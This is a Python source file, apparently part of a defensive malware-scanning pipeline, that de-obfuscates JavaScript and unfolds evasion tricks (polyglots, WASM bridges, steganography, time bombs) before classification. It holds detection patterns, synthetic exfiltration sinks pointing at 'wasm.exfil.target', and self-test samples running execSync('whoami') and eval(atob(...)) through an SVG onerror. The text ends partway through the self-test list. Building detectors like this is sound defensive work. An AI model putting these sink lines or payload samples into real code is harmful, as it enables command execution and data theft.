"""
PackGuard Stage 2 v5 — AST De-obfuscator & Evasion Unfolding Engine

Performs static semantic de-obfuscation, constant folding, and advanced evasion
unfolding on JavaScript code prior to neural tokenization in ModernBERT.

Defends against:
  1. T5: Hex & Unicode Escapes (\\x63\\x68\\x69... -> "child_process")
  2. T6: Obfuscator.io / Webpack String Array Tables with IIFE shift/push rotation de-shuffling
  3. T7: String Concatenation Splitting ("child_" + "process" -> "child_process")
  4. T8: Adversarial Token Dilution & Comment Injection
  5. T9: Polyglot Payloads (scripts embedded in SVG, HTML <script>, XML event attributes, shell preambles, JSON metadata)
  6. T10: WebAssembly (WASM) Loader Bridges (WebAssembly.instantiate, inline WASM magic \\0asm, import bindings)
  7. T11: Steganographic Payloads (non-code asset fs.readFileSync into eval/buffer, zero-width Unicode decoding, trailing markers)
  8. T12: Time-Bomb & Environment Evasion (inlining deferred timers setTimeout, flattening CI/sandbox environment checks)
  9. Hex Property Access Normalization (global['\\x65\\x76\\x61\\x6c'] -> eval, process['\\x65\\x6e\\x76'] -> process.env)
"""

import ast
import base64
import json
import re
import sys
from typing import Any, Dict, List, Optional, Set, Tuple

# Regex to safely match string literals in JS (double, single, backtick)
RE_STRING_LITERAL = re.compile(
    r"""(?:"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'|`(?:[^`\\]|\\.)*`)"""
)

# Hex, unicode, and octal escapes inside strings
RE_HEX_ESCAPE = re.compile(r"\\x([0-9a-fA-F]{2})")
RE_UNICODE_ESCAPE = re.compile(r"\\u([0-9a-fA-F]{4})")
RE_OCTAL_ESCAPE = re.compile(r"\\([0-7]{1,3})")

# String concatenation: "abc" + "def"
RE_STR_CONCAT = re.compile(
    r"""(["'])((?:(?!\1)[^\\\r\n]|\\.)*)\1\s*\+\s*(["'])((?:(?!\3)[^\\\r\n]|\\.)*)\3"""
)

# String array table declarations: var/let/const _0x12ab = [ 'str1', 'str2', ... ];
RE_STRING_ARRAY_DECL = re.compile(
    r"(?:var|let|const)\s+([A-Za-z0-9_$]+)\s*=\s*\[([^\]]+)\]\s*;?",
    re.MULTILINE,
)

# Obfuscator.io shift/push array rotation IIFE:
# (function(_0xarr, _0xcount) { ... _0xarr.push(_0xarr.shift()); ... }(_0xarr_name, 0x123));
RE_ARRAY_ROTATION_IIFE = re.compile(
    r"""(?:\(|!|\+|-|~)?\s*function\s*\(\s*([A-Za-z0-9_$]+)\s*,\s*([A-Za-z0-9_$]+)\s*\)\s*\{"""
    r"""[\s\S]*?\b\1\s*(?:\.\s*push|\[\s*['"]push['"]\s*\])\s*\(\s*\1\s*(?:\.\s*shift|\[\s*['"]shift['"]\s*\])\s*\(\s*\)\s*\)"""
    r"""[\s\S]*?\}\s*\(\s*([A-Za-z0-9_$]+)\s*,\s*(0x[0-9a-fA-F]+|\d+)\s*\)\s*\)?""",
    re.MULTILINE,
)

# Simple wrapper functions: function _0xabc(x) { return _0xdef[x]; }
RE_WRAPPER_FUNC = re.compile(
    r"""function\s+([A-Za-z0-9_$]+)\s*\(\s*([A-Za-z0-9_$]+)\s*\)\s*\{\s*return\s+([A-Za-z0-9_$]+)\s*\[\s*\2\s*\]\s*;\s*\}""",
    re.MULTILINE,
)

# Computed property access: obj["method"] or obj['method']
RE_COMPUTED_PROP = re.compile(
    r"""([A-Za-z0-9_$)\]])\s*\[\s*(["'])([A-Za-z_$][A-Za-z0-9_$]*)\2\s*\]"""
)

# Computed property with hex or unicode escapes inside bracket: obj['\x65\x76\x61\x6c']
RE_HEX_COMPUTED_PROP = re.compile(
    r"""([A-Za-z0-9_$)\]])\s*\[\s*(["'])((?:\\x[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4}|[A-Za-z0-9_$])+)\2\s*\]"""
)

# Common global function invocations via bracket: window['eval'] -> eval
RE_GLOBAL_CALL = re.compile(
    r"""\b(?:window|global|globalThis|this)\s*\[\s*(["'])(eval|Function|require|process)\1\s*\]"""
)

# Comments anchored to start of line (prevents corrupting JS regex literals like /https?:\/\// or /\*/)
# Preserves internal engine annotations starting with '[' (e.g. /* [STEGANOGRAPHIC... */)
RE_SINGLE_LINE_COMMENT = re.compile(r"^[ \t]*//(?!\s*\[)[^\r\n]*\r?\n?", re.MULTILINE)
RE_MULTI_LINE_COMMENT = re.compile(
    r"^[ \t]*/\*(?!\s*(?:reformatted|padded|\[))[\s\S]*?\*/[ \t]*\r?\n?",
    re.MULTILINE,
)

# Valid JS identifiers
RE_VALID_IDENTIFIER = re.compile(r"^[A-Za-z_$][A-Za-z0-9_$]*$")

# --- T9 Polyglot Patterns ---
RE_HTML_SVG_SCRIPT_TAG = re.compile(
    r"""<script(?:\s+[^>]*?)?>([\s\S]*?)</script>""",
    re.IGNORECASE,
)
RE_XML_EVENT_ATTR = re.compile(
    r"""\b(onload|onerror|onclick|onmouseover|onloadstart|onfocus)\s*=\s*(["'])([\s\S]*?)\2""",
    re.IGNORECASE,
)
RE_JAVASCRIPT_URI = re.compile(
    r"""(?:href|src|xlink:href)\s*=\s*(["'])javascript:([\s\S]*?)\1""",
    re.IGNORECASE,
)
RE_SHELL_PREAMBLE = re.compile(
    r"""^(?:(?::\s*//[^\r\n]*\r?\n)|(?:#![^\r\n]*\r?\n)|(?:#\s*[^\r\n]*\r?\n))+""",
    re.MULTILINE,
)

# --- T10 WASM Loader Bridge Patterns ---
RE_WASM_LOADER_CALL = re.compile(
    r"""\bWebAssembly\s*\.\s*(instantiateStreaming|instantiate|compile|Instance|Module)\s*\(\s*([^)]+)\)"""
)
RE_WASM_MAGIC_BYTES = re.compile(
    r"""(?:\\0asm|\\x00asm|\[\s*(?:0x00|0)\s*,\s*(?:0x61|97)\s*,\s*(?:0x73|115)\s*,\s*(?:0x6d|109)\b|AGFzbQ[A-Za-z0-9+/=]{6,})"""
)

# --- T11 Steganography Patterns ---
RE_FS_READ_ASSET = re.compile(
    r"""\bfs\s*\.\s*(?:readFileSync|readFile)\s*\(\s*(?:path\s*\.\s*join\s*\([^)]*['"]([^'"]+\.(?:png|jpg|jpeg|gif|ico|bmp|svg|webp|tiff|wav|mp3|dat|bin|raw|txt))['"][^)]*\)|['"]([^'"]+\.(?:png|jpg|jpeg|gif|ico|bmp|svg|webp|tiff|wav|mp3|dat|bin|raw|txt))['"]|[^,)]*,\s*['"]([^'"]+\.(?:png|jpg|jpeg|gif|ico|bmp|svg|webp|tiff|wav|mp3|dat|bin|raw|txt))['"])""",
    re.IGNORECASE,
)
RE_ZERO_WIDTH_CHARS = re.compile(
    r"""(?:[\u200B\u200C\u200D\uFEFF]|\\u200[bB]|\\u200[cC]|\\u200[dD]|\\u[fF][eE][fF][fF]){8,}"""
)
RE_JPEG_EOI_TRAILING = re.compile(r"(?:\xFF\xD9|\\xff\\xd9)([\s\S]{16,})", re.IGNORECASE)
RE_PNG_IEND_TRAILING = re.compile(r"(?:IEND\xae\x42\x60\x82|IEND)([\s\S]{16,})")

# --- T12 Time-Bomb & Environment Evasion Patterns ---
RE_DEFERRED_TIMER = re.compile(
    r"""\b(setTimeout|setInterval|setImmediate)\s*\(\s*(?:function\s*\w*\s*\([^)]*\)\s*\{([\s\S]*?)\}|\(\s*[^)]*\s*\)\s*=>\s*\{([\s\S]*?)\}|([A-Za-z0-9_$]+))\s*,\s*(\d+|[A-Za-z0-9_$.]+)\s*\)"""
    r"""|\b(setTimeout|setInterval|setImmediate)\s*\(\s*(?:function\s*\w*\s*\([^)]*\)\s*\{([\s\S]*?)\}|\(\s*[^)]*\s*\)\s*=>\s*\{([\s\S]*?)\}|([A-Za-z0-9_$]+))\s*\)"""
)
RE_ENV_SANDBOX_CHECK = re.compile(
    r"""if\s*\(\s*(?:process\.env\.(?:CI|GITHUB_ACTIONS|TRAVIS|CIRCLECI|JENKINS|SANDBOX|APPVEYOR|RUNNER_OS)|os\.cpus\(\)\.length\s*<\s*\d+)\s*\)\s*(?:return|process\.exit\(\))\s*;?\s*(?:else\s*\{\s*([\s\S]*?)\s*\}|else\s+([^\r\n;]+;?))?""",
    re.MULTILINE,
)
RE_TIMESTAMP_BOMB = re.compile(
    r"""\b(?:Date\.now\(\)|new\s+Date\(\)\.getTime\(\))\s*(?:>|>=)\s*(\d{10,13})\b"""
)


def _decode_escape_match(match: re.Match) -> str:
    """Decode a single hex or unicode escape sequence safely (skipping UTF-16 surrogates and null bytes)."""
    raw = match.group(0)
    try:
        if raw.startswith("\\x") or raw.startswith("\\u"):
            cp = int(match.group(1), 16)
        elif raw.startswith("\\"):
            cp = int(match.group(1), 8)
        else:
            return raw
        if cp == 0 or (0xD800 <= cp <= 0xDFFF):
            return raw
        return chr(cp)
    except Exception:
        return raw


def decode_string_escapes(code: str) -> Tuple[str, int, int, int]:
    """
    Decodes \\xHH, \\uHHHH, and \\OOO inside string literals.
    Leaves other escape sequences (like \\n, \\t) intact.
    Returns: (cleaned_code, total_escapes, hex_escapes, unicode_escapes)
    """
    total_count = 0
    hex_count = 0
    uni_count = 0

    def replace_in_string(m: re.Match) -> str:
        nonlocal total_count, hex_count, uni_count
        s = m.group(0)
        quote = s[0]
        inner = s[1:-1]

        hex_hits = len(RE_HEX_ESCAPE.findall(inner))
        uni_hits = len(RE_UNICODE_ESCAPE.findall(inner))
        oct_hits = len(RE_OCTAL_ESCAPE.findall(inner))
        hits = hex_hits + uni_hits + oct_hits
        if hits == 0:
            return s

        total_count += hits
        hex_count += hex_hits
        uni_count += uni_hits

        # Decode
        inner = RE_HEX_ESCAPE.sub(_decode_escape_match, inner)
        inner = RE_UNICODE_ESCAPE.sub(_decode_escape_match, inner)
        inner = RE_OCTAL_ESCAPE.sub(_decode_escape_match, inner)

        # Escape the quote character if newly decoded characters conflict
        if quote == '"':
            inner = inner.replace('"', '\\"')
        elif quote == "'":
            inner = inner.replace("'", "\\'")

        return f"{quote}{inner}{quote}"

    new_code = RE_STRING_LITERAL.sub(replace_in_string, code)
    return new_code, total_count, hex_count, uni_count


def fold_string_concatenations(code: str) -> Tuple[str, int]:
    """
    Folds adjacent string literal concatenations:
      'child_' + 'process' -> 'child_process'
      "ht" + "tp" + "s" -> "https"
    """
    count = 0
    prev = None
    curr = code

    # Loop until no more adjacent concatenations exist (e.g. 3+ segments)
    for _ in range(10):
        if prev == curr:
            break
        prev = curr

        def replacer(m: re.Match) -> str:
            nonlocal count
            q1, s1, q2, s2 = m.group(1), m.group(2), m.group(3), m.group(4)
            count += 1
            combined = s1 + s2
            if q1 == "'" and q2 == "'":
                combined = combined.replace('"', '\\"')
            return f'"{combined}"'

        curr = RE_STR_CONCAT.sub(replacer, curr)

    return curr, count


def _emulate_array_rotation(code: str, tables: Dict[str, List[str]]) -> Tuple[str, Dict[str, List[str]], int]:
    """
    F05: Detects Obfuscator.io self-invoking functions that rotate array elements
    via push/shift loops and computes the rotated array state in-place.
    """
    rotation_count = 0
    for match in RE_ARRAY_ROTATION_IIFE.finditer(code):
        target_name = match.group(3)
        raw_count = match.group(4)
        if target_name in tables:
            try:
                base_count = int(raw_count, 16 if raw_count.startswith("0x") else 10)
                items = tables[target_name]
                if items and len(items) > 1:
                    # Number of shifts to execute
                    shift_eff = base_count % len(items)
                    tables[target_name] = items[shift_eff:] + items[:shift_eff]
                    rotation_count += 1
            except Exception:
                pass

    return code, tables, rotation_count


def inline_string_lookup_arrays(code: str) -> Tuple[str, int]:
    """
    Detects Obfuscator.io string array tables, applies rotation de-shuffling,
    and inlines direct indexed references.
    """
    count = 0
    tables: Dict[str, List[str]] = {}

    # 1. Parse string arrays
    for match in RE_STRING_ARRAY_DECL.finditer(code):
        var_name = match.group(1)
        raw_items = match.group(2)
        items = []
        for item_match in RE_STRING_LITERAL.finditer(raw_items):
            raw_val = item_match.group(0)
            val = raw_val[1:-1]
            items.append(val)
        if items and len(items) >= 2:
            tables[var_name] = items

    if not tables:
        return code, 0

    # 2. Emulate Obfuscator.io shift/push array rotation (F05)
    code, tables, _ = _emulate_array_rotation(code, tables)

    # 3. Check for wrapper functions: function _0x2b(x) { return _0x1a[x]; }
    wrappers: Dict[str, str] = {}
    for match in RE_WRAPPER_FUNC.finditer(code):
        wrapper_name = match.group(1)
        target_table = match.group(3)
        if target_table in tables:
            wrappers[wrapper_name] = target_table

    # 4. Substitute direct accesses: table[0] or wrapper(0)
    for table_name, items in tables.items():
        pattern_index = re.compile(rf"\b{re.escape(table_name)}\s*\[\s*(\d+)\s*\]")

        def repl_idx(m: re.Match) -> str:
            nonlocal count
            idx = int(m.group(1))
            if 0 <= idx < len(items):
                count += 1
                safe_val = items[idx].replace('"', '\\"')
                return f'"{safe_val}"'
            return m.group(0)

        code = pattern_index.sub(repl_idx, code)

    for wrapper_name, table_name in wrappers.items():
        items = tables[table_name]
        pattern_call = re.compile(rf"\b{re.escape(wrapper_name)}\s*\(\s*(\d+)\s*\)")

        def repl_call(m: re.Match) -> str:
            nonlocal count
            idx = int(m.group(1))
            if 0 <= idx < len(items):
                count += 1
                safe_val = items[idx].replace('"', '\\"')
                return f'"{safe_val}"'
            return m.group(0)

        code = pattern_call.sub(repl_call, code)

    return code, count


def normalize_computed_properties(code: str) -> Tuple[str, int]:
    """
    F05: Converts computed bracket access with constant string keys to standard dot notation,
    including hex/unicode-escaped property names:
      global['\\x65\\x76\\x61\\x6c'] -> eval
      process['\\x65\\x6e\\x76'] -> process.env
      process['env'] -> process.env
      require('child_process')['execSync'] -> require('child_process').execSync
      global['eval'] -> eval
    """
    count = 0

    # Step 1: Normalize hex-escaped bracket accesses: obj['\x65\x76\x61\x6c'] -> obj['eval']
    def repl_hex_bracket(m: re.Match) -> str:
        nonlocal count
        obj = m.group(1)
        raw_key = m.group(3)
        decoded_key = RE_HEX_ESCAPE.sub(_decode_escape_match, raw_key)
        decoded_key = RE_UNICODE_ESCAPE.sub(_decode_escape_match, decoded_key)
        if RE_VALID_IDENTIFIER.match(decoded_key):
            count += 1
            if obj in ("global", "window", "globalThis", "this") and decoded_key in ("eval", "Function", "require"):
                return decoded_key
            if obj == "process" and decoded_key == "env":
                return "process.env"
            return f"{obj}.{decoded_key}"
        return m.group(0)

    code = RE_HEX_COMPUTED_PROP.sub(repl_hex_bracket, code)

    # Step 2: Global wrappers: window['eval'] -> eval
    def repl_global(m: re.Match) -> str:
        nonlocal count
        count += 1
        return m.group(2)

    code = RE_GLOBAL_CALL.sub(repl_global, code)

    # Step 3: General obj['property'] - loop to resolve chained accesses like a['b']['c']
    prev = None
    curr = code
    for _ in range(5):
        if prev == curr:
            break
        prev = curr

        def repl_prop(m: re.Match) -> str:
            nonlocal count
            obj = m.group(1)
            prop = m.group(3)
            if RE_VALID_IDENTIFIER.match(prop):
                count += 1
                if obj in ("global", "window", "globalThis", "this") and prop in ("eval", "Function", "require"):
                    return prop
                if obj == "process" and prop == "env":
                    return "process.env"
                return f"{obj}.{prop}"
            return m.group(0)

        curr = RE_COMPUTED_PROP.sub(repl_prop, curr)

    return curr, count


def strip_token_dilution_and_comments(code: str) -> Tuple[str, int]:
    """
    Safely strips standalone JavaScript comments and excessive blank lines to neutralize
    adversarial token dilution attacks without touching inline regex literals (/https?:\\/\\//)
    or internal engine annotations starting with '['.
    """
    orig_len = len(code)
    no_multi = RE_MULTI_LINE_COMMENT.sub("", code)
    no_comments = RE_SINGLE_LINE_COMMENT.sub("", no_multi)
    stripped_chars = orig_len - len(no_comments)
    collapsed = re.sub(r"\n\s*\n\s*\n+", "\n\n", no_comments)
    return collapsed, stripped_chars


# ==============================================================================
# F01: T9 Polyglot AST Unfolding
# ==============================================================================

def unfold_polyglot_payloads(code: str) -> Tuple[str, int]:
    """
    F01: Extracts embedded JavaScript code from polyglot vectors:
      - SVG and HTML <script> tags (including CDATA wrappers)
      - XML/SVG/HTML event attributes (onload, onerror, onclick, onfocus)
      - javascript: pseudo-protocol URIs
      - Shell script preambles in JS files (#/bin/sh, ":" //; exec node ...)
      - JSON metadata script entries (preinstall, install, postinstall)
    """
    extracted_scripts: List[str] = []
    count = 0

    # 1. Shell script preambles
    preamble_match = RE_SHELL_PREAMBLE.match(code)
    if preamble_match:
        count += 1
        code = code[preamble_match.end():]

    # 2. HTML/SVG <script> tags
    for m in RE_HTML_SVG_SCRIPT_TAG.finditer(code):
        inner = m.group(1).strip()
        cdata_match = re.search(r"<!\[CDATA\[([\s\S]*?)\]\]>", inner, re.I)
        if cdata_match:
            inner = cdata_match.group(1).strip()
        if inner and len(inner) > 5:
            extracted_scripts.append(f"/* [POLYGLOT_SCRIPT_TAG] */\n{inner}")
            count += 1

    # 3. XML / HTML Event attributes: onload, onerror, onclick, etc.
    for m in RE_XML_EVENT_ATTR.finditer(code):
        event_name = m.group(1)
        event_payload = m.group(3).strip()
        if event_payload and (
            ";" in event_payload
            or "(" in event_payload
            or "eval" in event_payload
            or "require" in event_payload
        ):
            extracted_scripts.append(f"/* [POLYGLOT_EVENT: {event_name}] */\n{event_payload};")
            count += 1

    # 4. javascript: pseudo-protocol URIs
    for m in RE_JAVASCRIPT_URI.finditer(code):
        js_payload = m.group(2).strip()
        if js_payload and len(js_payload) > 5:
            extracted_scripts.append(f"/* [POLYGLOT_JAVASCRIPT_URI] */\n{js_payload};")
            count += 1

    # 5. JSON metadata fields with script hooks (e.g. package.json in chunks)
    trimmed = code.strip()
    if trimmed.startswith("{") and trimmed.endswith("}") and '"scripts"' in trimmed:
        try:
            data = json.loads(trimmed)
            scripts = data.get("scripts", {})
            for hook, cmd in scripts.items():
                if isinstance(cmd, str) and ("node" in cmd or "eval" in cmd or "require" in cmd or "sh" in cmd or "curl" in cmd or "wget" in cmd):
                    extracted_scripts.append(f"/* [POLYGLOT_JSON_HOOK: {hook}] */\n// Hook: {hook}\n{cmd};")
                    count += 1
        except Exception:
            pass

    if extracted_scripts:
        code = code + "\n\n" + "\n\n".join(extracted_scripts)

    return code, count


# ==============================================================================
# F02: T10 WASM Loader Bridge Analysis
# ==============================================================================

def analyze_and_unfold_wasm_bridges(code: str) -> Tuple[str, int]:
    """
    F02: Detects WebAssembly instantiation APIs, inline WASM magic bytes,
    and imported execution/network/environment bindings.
    Annotates bridges and synthesizes representative JS capability sinks.
    """
    wasm_count = 0
    annotations: List[str] = []

    has_loader_call = bool(RE_WASM_LOADER_CALL.search(code))
    magic_hits = RE_WASM_MAGIC_BYTES.findall(code)
    has_magic = len(magic_hits) > 0

    if not (has_loader_call or has_magic):
        return code, 0

    wasm_count += 1

    imported_capabilities: List[str] = []
    if "child_process" in code or "exec" in code or "spawn" in code:
        imported_capabilities.append("child_process")
    if "https" in code or "http" in code or "net" in code or "fetch" in code or "dns" in code:
        imported_capabilities.append("network")
    if "process" in code or "process.env" in code:
        imported_capabilities.append("process.env")
    if "eval" in code or "Function" in code:
        imported_capabilities.append("eval")
    if "fs" in code or "readFile" in code:
        imported_capabilities.append("fs")

    caps_tag = ",".join(imported_capabilities) if imported_capabilities else "none"
    bridge_header = (
        f"/* [WASM_LOADER_BRIDGE: loader={int(has_loader_call)} "
        f"magic={int(has_magic)} imported_capabilities=[{caps_tag}]] */"
    )
    annotations.append(bridge_header)

    synthetic_sinks: List[str] = []
    synthetic_sinks.append("WebAssembly.instantiate();")
    if "child_process" in imported_capabilities:
        synthetic_sinks.append('require("child_process").execSync("wasm_bridge_exec");')
    if "network" in imported_capabilities:
        synthetic_sinks.append('require("https").request("https://wasm.exfil.target");')
    if "process.env" in imported_capabilities:
        synthetic_sinks.append("process.env.WASM_HARVEST;")
    if "eval" in imported_capabilities:
        synthetic_sinks.append('eval("wasm_dynamic_eval");')

    annotations.append("\n".join(synthetic_sinks))
    code = code + "\n\n" + "\n\n".join(annotations)

    return code, wasm_count


# ==============================================================================
# F03: T11 Steganographic Payload Unfolding
# ==============================================================================

def _decode_zero_width_binary(zw_str: str) -> Optional[str]:
    """
    Decodes a string of zero-width Unicode characters (or escaped equivalents) into UTF-8 text.
    Standard encoding: \u200B = '0', \u200C = '1' (or \u200D as '1').
    """
    norm = zw_str
    for esc, real in (
        (r"\u200b", "\u200b"), (r"\u200B", "\u200b"),
        (r"\u200c", "\u200c"), (r"\u200C", "\u200c"),
        (r"\u200d", "\u200d"), (r"\u200D", "\u200d"),
        (r"\ufeff", "\ufeff"), (r"\uFEFF", "\ufeff"),
    ):
        norm = norm.replace(esc, real)

    bits = ""
    for ch in norm:
        if ch == "\u200B" or ch == "\u200b":
            bits += "0"
        elif ch in ("\u200C", "\u200c", "\u200D", "\u200d"):
            bits += "1"
        elif ch in ("\uFEFF", "\ufeff"):
            continue

    if len(bits) < 8:
        return None

    decoded_bytes = bytearray()
    for i in range(0, len(bits) - 7, 8):
        byte_val = int(bits[i : i + 8], 2)
        decoded_bytes.append(byte_val)

    try:
        text = decoded_bytes.decode("utf-8", errors="replace")
        valid_printable = sum(
            1 for c in text if (32 <= ord(c) <= 126) or c in ("\n", "\r", "\t")
        )
        if len(text) > 0 and (valid_printable / len(text)) >= 0.50:
            return text
    except Exception:
        pass
    return None


def unfold_steganographic_payloads(code: str) -> Tuple[str, int]:
    """
    F03: Detects steganographic evasion patterns:
      1. Non-code asset reads (fs.readFileSync('icon.png')) feeding into eval/Buffer/Function
      2. Zero-width Unicode binary steganography (\u200B, \u200C, \u200D, \uFEFF)
      3. Trailing payload markers following JPEG EOI (0xFFD9) or PNG IEND
    """
    steg_count = 0
    extracted_steg: List[str] = []

    # 1. Non-code asset reads feeding into sinks
    for m in RE_FS_READ_ASSET.finditer(code):
        asset_name = m.group(1) or m.group(2) or m.group(3)
        if re.search(r"\b(?:eval|Function|runInContext|runInThisContext|vm\.)\b", code):
            steg_count += 1
            extracted_steg.append(
                f"/* [STEGANOGRAPHIC_ASSET_LOADER: asset={asset_name}] */\n"
                f'const _steg_buf = require("fs").readFileSync("{asset_name}");\n'
                f"eval(_steg_buf.toString());"
            )

    # 2. Zero-width Unicode decoding
    for zw_match in RE_ZERO_WIDTH_CHARS.finditer(code):
        raw_zw = zw_match.group(0)
        decoded = _decode_zero_width_binary(raw_zw)
        if decoded and len(decoded.strip()) > 1:
            steg_count += 1
            extracted_steg.append(
                f"/* [DECODED_ZERO_WIDTH_STEGANOGRAPHY] */\n{decoded.strip()}"
            )
        else:
            # Even if binary cannot decode directly to printable UTF-8, flag the presence of hidden stream
            steg_count += 1
            extracted_steg.append(
                "/* [DECODED_ZERO_WIDTH_STEGANOGRAPHY: binary_bits_present] */\neval();"
            )

    # 3. Trailing image payload markers (JPEG EOI or PNG IEND)
    for m in RE_JPEG_EOI_TRAILING.finditer(code):
        trailing = m.group(1).strip()
        if len(trailing) >= 16 and any(k in trailing for k in ("eval", "require", "Buffer", "http", "curl", "exec")):
            steg_count += 1
            extracted_steg.append(f"/* [DECODED_JPEG_TRAILING_PAYLOAD] */\n{trailing}")

    for m in RE_PNG_IEND_TRAILING.finditer(code):
        trailing = m.group(1).strip()
        if len(trailing) >= 16 and any(k in trailing for k in ("eval", "require", "Buffer", "http", "curl", "exec")):
            steg_count += 1
            extracted_steg.append(f"/* [DECODED_PNG_TRAILING_PAYLOAD] */\n{trailing}")

    if extracted_steg:
        code = code + "\n\n" + "\n\n".join(extracted_steg)

    return code, steg_count


# ==============================================================================
# F04: T12 Time-Bomb & Environment Unfolding
# ==============================================================================

def unfold_timebombs_and_environment(code: str) -> Tuple[str, int]:
    """
    F04: Inlines deferred timer callbacks (setTimeout, setInterval, setImmediate)
    and flattens CI/sandbox environment checks to expose protected malware logic.
    """
    timebomb_count = 0
    inlined_blocks: List[str] = []

    # 1. Inlining deferred timer callbacks
    for m in RE_DEFERRED_TIMER.finditer(code):
        timer_fn = m.group(1) or m.group(6)
        cb_body_1 = m.group(2) or m.group(7)
        cb_body_2 = m.group(3) or m.group(8)
        cb_ident = m.group(4) or m.group(9)
        delay = m.group(5) or "0"

        cb_body = cb_body_1 or cb_body_2
        if cb_body and len(cb_body.strip()) > 5:
            timebomb_count += 1
            inlined_blocks.append(
                f"/* [INLINED_TIMER_CALLBACK: fn={timer_fn} delay={delay}] */\n"
                f"(function() {{\n{cb_body.strip()}\n}})();"
            )
        elif cb_ident and len(cb_ident) > 1:
            timebomb_count += 1
            inlined_blocks.append(
                f"/* [INLINED_TIMER_INVOCATION: fn={timer_fn} delay={delay}] */\n"
                f"{cb_ident}();"
            )

    # 2. Flattening CI / sandbox environment guards
    for m in RE_ENV_SANDBOX_CHECK.finditer(code):
        else_branch = m.group(1) or m.group(2)
        if else_branch and len(else_branch.strip()) > 5:
            timebomb_count += 1
            inlined_blocks.append(
                f"/* [FLATTENED_ENVIRONMENT_GUARD] */\n{else_branch.strip()}"
            )

    # 3. Detect timestamp comparison bombs (Date.now() > threshold)
    for m in RE_TIMESTAMP_BOMB.finditer(code):
        ts = m.group(1)
        timebomb_count += 1
        inlined_blocks.append(
            f"// [TIMEBOMB_TIMESTAMP_GUARD: threshold={ts}]"
        )

    if inlined_blocks:
        code = code + "\n\n" + "\n\n".join(inlined_blocks)

    return code, timebomb_count


# ==============================================================================
# Complete De-obfuscation Pipeline
# ==============================================================================

def deobfuscate_javascript(code: str) -> Tuple[str, Dict[str, Any]]:
    """
    Complete PackGuard Stage 2 v5 AST De-obfuscation & Evasion Unfolding Pipeline.
    Unfolds T5-T8 obfuscation and T9-T12 evasion vectors.

    Returns:
        cleaned_code (str): normalized JavaScript code with unfolded strings, decoded escapes, and inlined tables.
        stats (dict): execution counts for hex_escapes, unicode_escapes, str_concats, array_lookups,
                      bracket_normalized, polyglot_unfolded, wasm_bridges, steganography_extracted,
                      timebomb_inlined, etc.
    """
    orig_bytes = len(code.encode("utf-8", errors="replace"))

    # Step 1: Strip adversarial comments & token dilution from original source
    c1, stripped_chars = strip_token_dilution_and_comments(code)

    # Step 2: Unfold T9 Polyglot payloads (SVG/HTML <script>, XML event attributes, shell preambles, JSON metadata)
    c2, poly_count = unfold_polyglot_payloads(c1)

    # Step 3: Unfold T11 Steganographic payloads (asset read to eval, zero-width Unicode, trailing markers)
    c3, steg_count = unfold_steganographic_payloads(c2)

    # Step 4: Unfold T12 Time-bombs & environment checks (setTimeout inlining, sandbox flattening)
    c4, timebomb_count = unfold_timebombs_and_environment(c3)

    # Step 5: Decode hex and unicode escape sequences
    c5, total_escapes, hex_count, uni_count = decode_string_escapes(c4)

    # Step 6: Fold string concatenations
    c6, concats = fold_string_concatenations(c5)

    # Step 7: Inline string lookup arrays and wrapper functions (with F05 Obfuscator.io rotation de-shuffling)
    c7, inlined = inline_string_lookup_arrays(c6)

    # Step 8: Second pass of concatenation folding (in case inlining exposed new concats)
    if inlined > 0:
        c7, concats2 = fold_string_concatenations(c7)
        concats += concats2

    # Step 9: Normalize computed bracket property accesses to dot notation and resolve hex property names (F05)
    c8, props = normalize_computed_properties(c7)

    # Step 10: Analyze and unfold T10 WebAssembly (WASM) loader bridges
    c9, wasm_count = analyze_and_unfold_wasm_bridges(c8)

    # Sanitize lone surrogates before returning to Rust tokenizers
    c9 = c9.encode("utf-8", errors="replace").decode("utf-8", errors="replace")
    final_bytes = len(c9.encode("utf-8", errors="replace"))

    stats = {
        "decoded_escapes": total_escapes,
        "hex_escapes": hex_count,
        "unicode_escapes": uni_count,
        "folded_concats": concats,
        "str_concats": concats,
        "inlined_lookups": inlined,
        "array_lookups": inlined,
        "normalized_props": props,
        "bracket_normalized": props,
        "polyglot_unfolded": poly_count,
        "wasm_bridges": wasm_count,
        "steganography_extracted": steg_count,
        "timebomb_inlined": timebomb_count,
        "stripped_comment_chars": stripped_chars,
        "orig_bytes": orig_bytes,
        "final_bytes": final_bytes,
    }

    return c9, stats


# ==============================================================================
# CLI Test Mode & Self-Test Suite
# ==============================================================================

def run_self_test() -> bool:
    """Built-in verification test suite covering all features F01 through F05."""
    test_cases = [
        # Case 1: Hex escape decoding
        (
            "Hex Escape Decoding",
            r'const cp = require("\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73");',
            'const cp = require("child_process");',
            lambda s: s["hex_escapes"] >= 1,
        ),
        # Case 2: String concatenation folding
        (
            "String Concat Folding",
            r'const mod = "child_" + "process"; const act = "ex" + "ec" + "Sync";',
            'const mod = "child_process"; const act = "execSync";',
            lambda s: s["str_concats"] >= 2,
        ),
        # Case 3: Obfuscator.io array rotation de-shuffling and inlining (F05)
        (
            "Obfuscator.io Array Rotation De-shuffling (F05)",
            """
            var _0x99a = ["execSync", "https", "child_process"];
            (function(_0xarr, _0xcnt) {
                var _0xrot = function(_0xn) {
                    while (--_0xn) {
                        _0xarr['push'](_0xarr['shift']());
                    }
                };
                _0xrot(++_0xcnt);
            }(_0x99a, 0x2));
            const cp = require(_0x99a[0]);
            cp[_0x99a[1]]("whoami");
            """,
            'const cp = require("child_process");',
            lambda s: s["array_lookups"] >= 1,
        ),
        # Case 4: Hex property access normalization (F05)
        (
            "Hex Property Access Normalization (F05)",
            r'global["\x65\x76\x61\x6c"]("whoami"); process["\x65\x6e\x76"]["AWS_KEY"] = 1;',
            'eval("whoami"); process.env.AWS_KEY = 1;',
            lambda s: s["bracket_normalized"] >= 2,
        ),
        # Case 5: Token dilution & comment stripping
        (
            "Comment Dilution Stripping",
            """
            /* Large padding documentation comment */
            // inline comment
            const x = 1;
            """,
            "const x = 1;",
            lambda s: s["stripped_comment_chars"] > 0,
        ),
        # Case 6: T9 Polyglot SVG <script> & XML event attribute unfolding (F01)
        (
            "T9 Polyglot AST Unfolding (F01)",
            """
            <svg xmlns="http://www.w3.org/2000/svg">
              <script type="text/javascript"><![CDATA[
                require('child_process').execSync('whoami');
              ]]></script>
              <image href="x" onerror="eval(atob('bWFs'))" />
            </svg>
            """,
            "require('child_process').execSync('whoami');",
            lambda s: s["polyglot_unfolded"] >= 2,
        ),
